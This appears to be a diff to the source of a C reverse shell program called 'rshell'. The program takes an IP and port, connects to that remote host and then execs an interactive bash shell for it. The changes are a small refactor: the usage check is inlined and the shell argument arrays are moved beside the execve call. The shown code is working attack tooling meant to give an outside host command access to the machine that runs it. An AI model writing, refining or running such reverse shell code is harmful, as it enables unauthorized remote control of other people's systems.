@@ -11,13 +11,6 @@
 
 #define _PROGRAM_NAME "rshell"
 
-int USAGE(int argc){
-        if (argc < 2) {
-                printf( "Usage: ./rshell ip port\n" );
-                exit(0);
-        }
-}
-
 int EXISTS(const char *path){
         FILE *fptr = fopen(path, "r");
         if (fptr == NULL){return 0;}
@@ -27,9 +20,10 @@ int EXISTS(const char *path){
 
 int main(int argc, char * argv[]){
         argc--;   argv++;
-        char *args[] = {"/usr/bin/bash", "-i", 0};
-        char *envp[] = {"/usr/bin/bash", 0};
-        USAGE(argc);
+        if (argc < 2) {
+                printf( "Usage: ./rshell ip port\n" );
+                exit(0);
+        }
         struct sockaddr_in revsockaddr;
 
         puts("[i] Connecting");
@@ -91,7 +85,8 @@ int main(int argc, char * argv[]){
 
         // STABILIZE
         puts("[+] Stabilized");
+        char *args[] = {"/usr/bin/bash", "-i", 0};
+        char *envp[] = {"/usr/bin/bash", 0};
         execve(args[0], &args[0], envp);
-
         return 0;
 }
